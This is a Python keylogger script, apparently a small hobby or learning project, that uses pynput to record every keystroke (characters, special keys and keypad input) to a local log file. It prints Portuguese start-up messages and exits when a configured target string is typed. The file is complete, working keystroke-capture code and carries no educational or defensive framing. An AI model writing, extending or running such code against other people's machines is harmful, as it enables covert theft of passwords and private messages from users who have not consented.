import os
import sys

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from pynput import keyboard
from config.key_mappings import KeyMappings
from config.settings import Settings

TARGET_STRING = Settings.TARGET_STRING
typed_chars = []

def on_press(key):
    global typed_chars
    
    log_content = ""
    should_write_to_file = True
    
    try:
        char = key.char
        if char is not None and isinstance(char, str):
            log_content = char  
            
            if char.isprintable() and char not in ['\t', '\n', '\b']:
                typed_chars.append(char)
        else:
            raise AttributeError("char is None or not string")
        
    except AttributeError:
        key_str = str(key)
        
        if key in KeyMappings.SPECIAL_KEYS:
            special_char = KeyMappings.SPECIAL_KEYS[key]
            if special_char:  
                log_content = special_char  
            
            if key == keyboard.Key.backspace:
                if typed_chars:
                    typed_chars.pop()
                    
        elif key_str in KeyMappings.KEYPAD_MAP:                
            keypad_char = KeyMappings.KEYPAD_MAP[key_str]
            log_content = keypad_char  
            
            if key_str in KeyMappings.KEYPAD_NUMBERS:
                num_char = KeyMappings.KEYPAD_NUMBERS[key_str]
                typed_chars.append(num_char)
                
        elif key in KeyMappings.IGNORED_KEYS:
            should_write_to_file = False  
        else:
            key_name = str(key).replace('Key.', '').replace("'", "")
            log_content = f'[{key_name}]'
    
    if should_write_to_file and log_content:
        with open(Settings.LOG_FILE_PATH, "a", encoding=Settings.ENCODING) as log_file:
            log_file.write(log_content)
    
    if len(typed_chars) > len(TARGET_STRING):
        typed_chars = typed_chars[-len(TARGET_STRING):]
    
    current_string = ''.join(typed_chars)
    if TARGET_STRING in current_string:
        print("Hacker discovered! Encerrando programa...")
        os._exit(0)
        return False

def on_release(key):
    pass

def main():
    print("Keylogger iniciado...")
    print(f"Digite '{TARGET_STRING}' para encerrar o programa")    
    
    if not os.path.exists(Settings.LOG_FILE_PATH):
        with open(Settings.LOG_FILE_PATH, "w", encoding=Settings.ENCODING) as f:
            f.write("=== Início do Log ===\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()